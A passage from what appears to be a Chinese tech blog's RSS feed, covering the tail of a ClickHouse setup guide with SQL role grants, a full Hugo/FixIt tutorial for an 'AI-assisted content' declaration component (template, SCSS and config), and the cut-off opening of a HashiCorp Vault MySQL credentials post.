 &lt;td&gt;&lt;code&gt;ALTER UPDATE / DELETE&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;高成本&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;SYSTEM STOP MERGES&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;影响全局&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="15-最小可复用初始化模板汇总"&gt;&lt;span&gt;15. 最小可复用初始化模板（汇总）&lt;/span&gt;
 &lt;a href="#15-%e6%9c%80%e5%b0%8f%e5%8f%af%e5%a4%8d%e7%94%a8%e5%88%9d%e5%a7%8b%e5%8c%96%e6%a8%a1%e6%9d%bf%e6%b1%87%e6%80%bb" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;-- 数据库
CREATE DATABASE dbtest ON CLUSTER default_cluster ENGINE = Replicated(&amp;#39;/clickhouse/databases/dbtest&amp;#39;, &amp;#39;{shard}&amp;#39;, &amp;#39;{replica}&amp;#39;);

-- 表
-- 若数据库创建使用 ON CLUSTER，表创建不再使用 ON CLUSTER
-- 推荐增加 TTL
CREATE TABLE dbtest.test_table
-- ON CLUSTER default_cluster 
(...)
ENGINE = ReplicatedMergeTree ORDER BY (...);

-- 角色
CREATE ROLE dbtest_read;
CREATE ROLE dbtest_write;
CREATE ROLE ops_role;

GRANT SELECT ON dbtest.* TO dbtest_read;
GRANT SELECT, INSERT ON dbtest.* TO dbtest_write;
GRANT SELECT, CREATE, ALTER, SYSTEM, OPTIMIZE ON *.* TO ops_role;&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>AI创作内容声明组件</title><link>https://blog.0x5c0f.cc/posts/hugo/ai%E5%88%9B%E4%BD%9C%E5%86%85%E5%AE%B9%E5%A3%B0%E6%98%8E%E7%BB%84%E4%BB%B6/</link><pubDate>Tue, 25 Nov 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/hugo/ai%E5%88%9B%E4%BD%9C%E5%86%85%E5%AE%B9%E5%A3%B0%E6%98%8E%E7%BB%84%E4%BB%B6/</guid><category domain="https://blog.0x5c0f.cc/categories/%E6%95%B4%E7%90%86%E6%94%B6%E9%9B%86/">整理收集</category><category domain="https://blog.0x5c0f.cc/categories/hugo/">Hugo</category><description>&lt;h1 class="heading-element" id="1-本文使用-custom-post__contentbefore-自定义块实现"&gt;&lt;span&gt;1. 本文使用 &lt;code&gt;custom-post__content:before&lt;/code&gt; 自定义块实现&lt;/span&gt;
 &lt;a href="#1-%e6%9c%ac%e6%96%87%e4%bd%bf%e7%94%a8-custom-post__contentbefore-%e8%87%aa%e5%ae%9a%e4%b9%89%e5%9d%97%e5%ae%9e%e7%8e%b0" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="11-文章页内容前自定义块"&gt;&lt;span&gt;1.1. 文章页内容前自定义块&lt;/span&gt;
 &lt;a href="#11-%e6%96%87%e7%ab%a0%e9%a1%b5%e5%86%85%e5%ae%b9%e5%89%8d%e8%87%aa%e5%ae%9a%e4%b9%89%e5%9d%97" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// 代码位置: layouts/partials/extended/ai-declaration.html

{{- /* 
配置优先级：
1. 页面 Front Matter (.Params.aiDeclaration)
2. 全局配置 (site.Params.page.aiDeclaration)
3. 内置默认值
*/ -}}

{{- /* 获取页面级配置 */ -}}
{{- $pageConfig := .Params.aiDeclaration -}}

{{- /* 获取全局配置 */ -}}
{{- $globalConfig := site.Params.page.aiDeclaration -}}

{{- /* 合并配置：页面配置优先，未设置的使用全局配置 */ -}}
{{- $enable := false -}}
{{- $description := &amp;#34;&amp;#34; -}}
{{- $url := &amp;#34;&amp;#34; -}}

{{- if $pageConfig -}}
 {{- /* 页面有配置，使用页面的 enable */ -}}
 {{- $enable = $pageConfig.enable -}}
 {{- /* description 优先级：页面 &amp;gt; 全局 &amp;gt; 默认 */ -}}
 {{- $description = $pageConfig.description | default $globalConfig.description | default &amp;#34;本文使用 AI 工具辅助创作，内容已经人工审核。&amp;#34; -}}
 {{- /* url 优先级：页面 &amp;gt; 全局 */ -}}
 {{- $url = $pageConfig.url | default $globalConfig.url -}}
{{- else if $globalConfig -}}
 {{- /* 页面无配置，使用全局配置 */ -}}
 {{- $enable = $globalConfig.enable -}}
 {{- $description = $globalConfig.description | default &amp;#34;本文使用 AI 工具辅助创作，内容已经人工审核。&amp;#34; -}}
 {{- $url = $globalConfig.url -}}
{{- end -}}

{{- /* 只有 enable 为 true 时才显示组件 */ -}}
{{- if $enable -}}
&amp;lt;div class=&amp;#34;ai-declaration&amp;#34; data-expanded=&amp;#34;false&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;ai-declaration-header&amp;#34; onclick=&amp;#34;this.parentElement.dataset.expanded = this.parentElement.dataset.expanded === &amp;#39;false&amp;#39; ? &amp;#39;true&amp;#39; : &amp;#39;false&amp;#39;&amp;#34;&amp;gt;
 &amp;lt;svg class=&amp;#34;ai-icon&amp;#34; viewBox=&amp;#34;0 0 24 24&amp;#34; fill=&amp;#34;none&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;
 &amp;lt;path d=&amp;#34;M12 2L2 7L12 12L22 7L12 2Z&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;path d=&amp;#34;M2 17L12 22L22 17&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;path d=&amp;#34;M2 12L12 17L22 12&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;/svg&amp;gt;
 &amp;lt;span class=&amp;#34;ai-declaration-text&amp;#34;&amp;gt;{{ T &amp;#34;aiDeclaration&amp;#34; | default &amp;#34;作者声明：内容由AI辅助创作&amp;#34; }}&amp;lt;/span&amp;gt;
 &amp;lt;svg class=&amp;#34;arrow-icon&amp;#34; viewBox=&amp;#34;0 0 24 24&amp;#34; fill=&amp;#34;none&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;
 &amp;lt;path d=&amp;#34;M6 9L12 15L18 9&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;/svg&amp;gt;
 &amp;lt;/div&amp;gt;
 
 &amp;lt;div class=&amp;#34;ai-declaration-content&amp;#34;&amp;gt;
 {{- if $description -}}
 &amp;lt;div class=&amp;#34;ai-detail-item&amp;#34;&amp;gt;
 &amp;lt;svg class=&amp;#34;detail-icon&amp;#34; viewBox=&amp;#34;0 0 24 24&amp;#34; fill=&amp;#34;none&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;
 &amp;lt;circle cx=&amp;#34;12&amp;#34; cy=&amp;#34;12&amp;#34; r=&amp;#34;10&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34;/&amp;gt;
 &amp;lt;path d=&amp;#34;M12 16V12M12 8H12.01&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;/svg&amp;gt;
 &amp;lt;span class=&amp;#34;ai-value&amp;#34;&amp;gt;{{ $description | markdownify }}&amp;lt;/span&amp;gt;
 &amp;lt;/div&amp;gt;
 {{- end -}}
 
 {{- if $url -}}
 &amp;lt;div class=&amp;#34;ai-detail-item ai-link-item&amp;#34;&amp;gt;
 &amp;lt;svg class=&amp;#34;detail-icon&amp;#34; viewBox=&amp;#34;0 0 24 24&amp;#34; fill=&amp;#34;none&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;
 &amp;lt;path d=&amp;#34;M10 13C10.4295 13.5741 10.9774 14.0492 11.6066 14.3929C12.2357 14.7367 12.9315 14.9411 13.6467 14.9923C14.3618 15.0435 15.0796 14.9404 15.7513 14.6898C16.4231 14.4392 17.0331 14.0471 17.54 13.54L20.54 10.54C21.4508 9.59699 21.9548 8.33397 21.9434 7.02299C21.932 5.71201 21.4061 4.45794 20.4791 3.5309C19.5521 2.60386 18.298 2.07802 16.987 2.06663C15.676 2.05524 14.413 2.55921 13.47 3.47L11.75 5.18&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;path d=&amp;#34;M14 11C13.5705 10.4259 13.0226 9.95084 12.3934 9.60707C11.7642 9.26331 11.0685 9.05889 10.3533 9.00769C9.63819 8.95649 8.92037 9.05963 8.24861 9.31022C7.57685 9.56081 6.96689 9.9529 6.45996 10.46L3.45996 13.46C2.54917 14.403 2.04519 15.666 2.05659 16.977C2.06798 18.288 2.59382 19.5421 3.52086 20.4691C4.4479 21.3961 5.70197 21.922 7.01295 21.9334C8.32393 21.9448 9.58694 21.4408 10.53 20.53L12.24 18.82&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;/svg&amp;gt;
 &amp;lt;a href=&amp;#34;{{ $url }}&amp;#34; target=&amp;#34;_blank&amp;#34; rel=&amp;#34;noopener noreferrer&amp;#34; class=&amp;#34;ai-link&amp;#34;&amp;gt;
 {{ T &amp;#34;aiDeclarationMore&amp;#34; | default &amp;#34;查看详细说明&amp;#34; }}
 &amp;lt;svg class=&amp;#34;external-icon&amp;#34; viewBox=&amp;#34;0 0 24 24&amp;#34; fill=&amp;#34;none&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;
 &amp;lt;path d=&amp;#34;M18 13V19C18 19.5304 17.7893 20.0391 17.4142 20.4142C17.0391 20.7893 16.5304 21 16 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V8C3 7.46957 3.21071 6.96086 3.58579 6.58579C3.96086 6.21071 4.46957 6 5 6H11M15 3H21M21 3V9M21 3L10 14&amp;#34; stroke=&amp;#34;currentColor&amp;#34; stroke-width=&amp;#34;2&amp;#34; stroke-linecap=&amp;#34;round&amp;#34; stroke-linejoin=&amp;#34;round&amp;#34;/&amp;gt;
 &amp;lt;/svg&amp;gt;
 &amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 {{- end -}}
 &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
{{- end -}}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="12-相关样式"&gt;&lt;span&gt;1.2. 相关样式&lt;/span&gt;
 &lt;a href="#12-%e7%9b%b8%e5%85%b3%e6%a0%b7%e5%bc%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;/* 代码位置: assets/css/_custom.scss */

/* ============================================
 AI 声明组件样式 - FixIt 主题定制 start
 ============================================ */

.ai-declaration {
 position: relative;
 margin: 0 0 1.5rem 0;
 border-radius: 8px;
 overflow: hidden;
 transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
 
 /* 浅色模式 */
 background: linear-gradient(135deg, rgba(99, 102, 241, 0.05) 0%, rgba(139, 92, 246, 0.05) 100%);
 border: 1px solid rgba(99, 102, 241, 0.2);
 box-shadow: 0 1px 3px rgba(99, 102, 241, 0.1);
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 background: linear-gradient(135deg, rgba(99, 102, 241, 0.1) 0%, rgba(139, 92, 246, 0.1) 100%);
 border: 1px solid rgba(99, 102, 241, 0.3);
 box-shadow: 0 1px 3px rgba(99, 102, 241, 0.2);
 }
}

/* 头部区域 */
.ai-declaration-header {
 display: flex;
 align-items: center;
 gap: 10px;
 padding: 12px 16px;
 cursor: pointer;
 user-select: none;
 transition: all 0.2s ease;
 
 /* 浅色模式 */
 color: #4338ca;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #818cf8;
 }
 
 &amp;amp;:hover {
 background: rgba(99, 102, 241, 0.08);
 
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 background: rgba(99, 102, 241, 0.15);
 }
 }
 
 &amp;amp;:active {
 transform: scale(0.99);
 }
}

/* AI 图标 */
.ai-icon {
 width: 20px;
 height: 20px;
 flex-shrink: 0;
 animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
 
 /* 浅色模式 */
 color: #6366f1;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #818cf8;
 }
}

@keyframes pulse {
 0%, 100% {
 opacity: 1;
 }
 50% {
 opacity: 0.7;
 }
}

/* 声明文本 */
.ai-declaration-text {
 flex: 1;
 font-size: 14px;
 font-weight: 500;
 letter-spacing: 0.01em;
 line-height: 1.5;
}

/* 箭头图标 */
.arrow-icon {
 width: 18px;
 height: 18px;
 flex-shrink: 0;
 transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
 
 /* 浅色模式 */
 color: #6366f1;
 opacity: 0.6;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #818cf8;
 opacity: 0.7;
 }
}

.ai-declaration[data-expanded=&amp;#34;true&amp;#34;] .arrow-icon {
 transform: rotate(180deg);
}

/* 内容区域 */
.ai-declaration-content {
 max-height: 0;
 overflow: hidden;
 transition: max-height 0.3s cubic-bezier(0.4, 0, 0.2, 1),
 padding 0.3s cubic-bezier(0.4, 0, 0.2, 1),
 opacity 0.3s ease;
 padding: 0 16px;
 opacity: 0;
 
 /* 浅色模式 */
 color: #374151;
 background: rgba(255, 255, 255, 0.6);
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #d1d5db;
 background: rgba(0, 0, 0, 0.2);
 }
}

.ai-declaration[data-expanded=&amp;#34;true&amp;#34;] .ai-declaration-content {
 max-height: 500px;
 padding: 16px;
 opacity: 1;
 border-top: 1px solid rgba(99, 102, 241, 0.15);
 
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 border-top-color: rgba(99, 102, 241, 0.25);
 }
}

/* 详情项 */
.ai-detail-item {
 display: flex;
 align-items: flex-start;
 gap: 10px;
 margin-bottom: 12px;
 line-height: 1.6;
 font-size: 14px;
 
 &amp;amp;:last-child {
 margin-bottom: 0;
 }
}

/* 详情图标 */
.detail-icon {
 width: 18px;
 height: 18px;
 flex-shrink: 0;
 margin-top: 2px;
 
 /* 浅色模式 */
 color: #6366f1;
 opacity: 0.8;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #818cf8;
 opacity: 0.9;
 }
}

/* 详情值 */
.ai-value {
 flex: 1;
 
 /* 浅色模式 */
 color: #1f2937;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #e5e7eb;
 }
 
 p {
 margin: 0;
 line-height: 1.6;
 
 &amp;amp;:not(:last-child) {
 margin-bottom: 0.5em;
 }
 }
 
 code {
 padding: 2px 6px;
 border-radius: 3px;
 font-size: 0.9em;
 
 /* 浅色模式 */
 background: rgba(99, 102, 241, 0.1);
 color: #4338ca;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 background: rgba(99, 102, 241, 0.2);
 color: #a5b4fc;
 }
 }
}

/* 链接项 */
.ai-link-item {
 margin-top: 8px;
 padding-top: 12px;
 border-top: 1px dashed rgba(99, 102, 241, 0.2);
 
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 border-top-color: rgba(99, 102, 241, 0.3);
 }
}

/* AI 链接 */
.ai-link {
 display: inline-flex;
 align-items: center;
 gap: 4px;
 font-weight: 500;
 text-decoration: none;
 transition: all 0.2s ease;
 
 /* 浅色模式 */
 color: #6366f1;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #818cf8;
 }
 
 &amp;amp;:hover {
 /* 浅色模式 */
 color: #4338ca;
 text-decoration: underline;
 
 /* 深色模式 */
 [theme=&amp;#39;dark&amp;#39;] &amp;amp; {
 color: #a5b4fc;
 }
 
 .external-icon {
 transform: translate(2px, -2px);
 }
 }
 
 &amp;amp;:active {
 transform: scale(0.98);
 }
}

/* 外部链接图标 */
.external-icon {
 width: 14px;
 height: 14px;
 transition: transform 0.2s ease;
}

/* 响应式设计 */
@media (max-width: 768px) {
 .ai-declaration {
 margin: 0 0 1rem 0;
 border-radius: 8px;
 }
 
 .ai-declaration-header {
 padding: 10px 14px;
 }
 
 .ai-declaration-text {
 font-size: 13px;
 }
 
 .ai-detail-item {
 font-size: 13px;
 gap: 8px;
 }
 
 .detail-icon {
 width: 16px;
 height: 16px;
 }
}

/* 超小屏幕 */
@media (max-width: 480px) {
 .ai-declaration-header {
 gap: 8px;
 }
 
 .ai-icon {
 width: 18px;
 height: 18px;
 }
 
 .arrow-icon {
 width: 16px;
 height: 16px;
 }
}

/* 打印样式 */
@media print {
 .ai-declaration {
 border: 1px solid #d1d5db !important;
 background: #f9fafb !important;
 page-break-inside: avoid;
 box-shadow: none !important;
 }
 
 .ai-declaration-content {
 max-height: none !important;
 padding: 16px !important;
 display: block !important;
 opacity: 1 !important;
 border-top: 1px solid #e5e7eb !important;
 }
 
 .arrow-icon {
 display: none;
 }
 
 .ai-link {
 color: #4338ca !important;
 
 &amp;amp;::after {
 content: &amp;#34; (&amp;#34; attr(href) &amp;#34;)&amp;#34;;
 font-size: 0.85em;
 color: #6b7280;
 }
 }
 
 .external-icon {
 display: none;
 }
}

/* 减少动画 */
@media (prefers-reduced-motion: reduce) {
 .ai-declaration,
 .ai-declaration-content,
 .arrow-icon,
 .ai-link,
 .external-icon,
 .ai-icon {
 transition: none !important;
 animation: none !important;
 }
}

/* 高对比度模式 */
@media (prefers-contrast: high) {
 .ai-declaration {
 border-width: 2px;
 }
 
 .ai-declaration-header {
 font-weight: 600;
 }
 
 .ai-link {
 text-decoration: underline;
 }
}

/* ============================================
 AI 声明组件样式 - FixIt 主题定制 end
 ============================================ */&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="13-configtoml-和-页面配置方法"&gt;&lt;span&gt;1.3. &lt;code&gt;config.toml&lt;/code&gt; 和 &lt;code&gt;页面配置&lt;/code&gt;方法&lt;/span&gt;
 &lt;a href="#13-configtoml-%e5%92%8c-%e9%a1%b5%e9%9d%a2%e9%85%8d%e7%bd%ae%e6%96%b9%e6%b3%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;config.toml&lt;/code&gt; 配置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# docs: https://fixit.lruihao.cn/zh-cn/references/blocks/
[params.customPartials]
 postContentBefore = [&amp;#34;extended/ai-declaration.html&amp;#34;]

[params.page.aiDeclaration]
 enable = false # 默认 false
 description = &amp;#34;&amp;#34; # 额外增加的说明字段, 默认 &amp;#34;本文使用 AI 工具辅助创作，内容已经人工审核。&amp;#34;, 支持markdown
 url = &amp;#34;&amp;#34; # 对话共享连接(也许还有其他作用?)&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;页面配置&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;--- 
# 文章是否由AI生成
aiDeclaration:
 enable: true
 description: |
 本文使用 **Claude 3.5 Sonnet** 辅助完成：
 - 文章结构规划
 - 代码示例生成
 - 技术细节解释优化

 所有代码均经过实际测试验证。
 url: https://claude.ai/
---&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>HashiCorp Vault的MySQL数据库凭据动态管理</title><link>https://blog.0x5c0f.cc/posts/linux/vault%E7%9A%84mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE%E5%8A%A8%E6%80%81%E7%AE%A1%E7%90%86/</link><pubDate>Tue, 18 Nov 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/vault%E7%9A%84mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE%E5%8A%A8%E6%80%81%E7%AE%A1%E7%90%86/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><category domain="https://blog.0x5c0f.cc/categories/%E6%95%B4%E7%90%86%E6%94%B6%E9%9B%86/">整理收集</category><category domain="https://blog.0x5c0f.cc/categories/other/">Other</category><description>&lt;h2 class="heading-element" id="-项目概述"&gt;&lt;span&gt;📋 项目概述&lt;/span&gt;
 &lt;a href="#-%e9%a1%b9%e7%9b%ae%e6%a6%82%e8%bf%b0" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="目标"&gt;&lt;span&gt;目标&lt;/span&gt;
 &lt;a href="#%e7%9b%ae%e6%a0%87" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;实现基于HashiCorp Vault的MySQL数据库凭据动态管理，包括动态角色、静态角色自动轮换、监控告警和安全审计。&lt;/p&gt;
&lt;h3 class="heading-element" id="架构组件"&gt;&lt;span&gt;架构组件&lt;/span&gt;
 &lt;a href="#%e6%9e%b6%e6%9e%84%e7%bb%84%e4%bb%b6" class="heading-mark"&gt;
